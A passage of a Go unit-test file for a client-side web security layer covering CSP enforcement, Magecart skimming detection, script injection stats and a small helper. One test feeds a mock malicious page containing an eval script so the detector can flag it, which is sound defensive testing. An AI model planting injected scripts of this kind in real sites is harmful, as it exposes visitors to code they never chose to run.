		t.Error("pattern should be set")
	}
	if match.Position < 0 {
		t.Error("position should be non-negative")
	}
	if match.Severity == "" {
		t.Error("severity should be set")
	}
}

// ---------------------------------------------------------------------------
// GetStats — tracking across operations
// ---------------------------------------------------------------------------

func TestGetStats_AfterOperations(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.CSP.Enabled = true
	cfg.CSP.ReportOnly = false
	cfg.MagecartDetection.Enabled = true
	cfg.MagecartDetection.DetectObfuscatedJS = true
	cfg.AgentInjection.Enabled = true
	cfg.AgentInjection.InjectPosition = "head"
	layer := NewLayer(cfg)

	// Process a request with CSP
	ctx := &engine.RequestContext{
		Method:   "GET",
		Path:     "/checkout",
		Metadata: make(map[string]any),
	}
	layer.Process(ctx)

	// Call CSP hook
	if hook, ok := ctx.Metadata["clientside_csp_hook"]; ok {
		hook.(func(http.ResponseWriter))(httptest.NewRecorder())
	}

	// Process response with malicious content
	if hook, ok := ctx.Metadata["clientside_response_hook"]; ok {
		hook.(func([]byte, string) ([]byte, bool))(
			[]byte(`<html><head></head><body><script>eval("evil")</script></body></html>`),
			"text/html",
		)
	}

	stats := layer.GetStats()
	if stats.CSPEnforced != 1 {
		t.Errorf("CSPEnforced = %d, want 1", stats.CSPEnforced)
	}
	if stats.ScannedResponses != 1 {
		t.Errorf("ScannedResponses = %d, want 1", stats.ScannedResponses)
	}
	if stats.ThreatsDetected != 1 {
		t.Errorf("ThreatsDetected = %d, want 1", stats.ThreatsDetected)
	}
	if stats.ScriptsInjected != 1 {
		t.Errorf("ScriptsInjected = %d, want 1", stats.ScriptsInjected)
	}
}

// ---------------------------------------------------------------------------
// minInt helper
// ---------------------------------------------------------------------------

func TestMinInt(t *testing.T) {
	tests := []struct {
		a, b, want int
	}{
		{1, 2, 1},
		{2, 1, 1},
		{5, 5, 5},
		{0, 1, 0},
		{-1, 1, -1},
	}
	for _, tt := range tests {
		if got := minInt(tt.a, tt.b); got != tt.want {
			t.Errorf("minInt(%d, %d) = %d, want %d", tt.a, tt.b, got, tt.want)
		}
	}
}
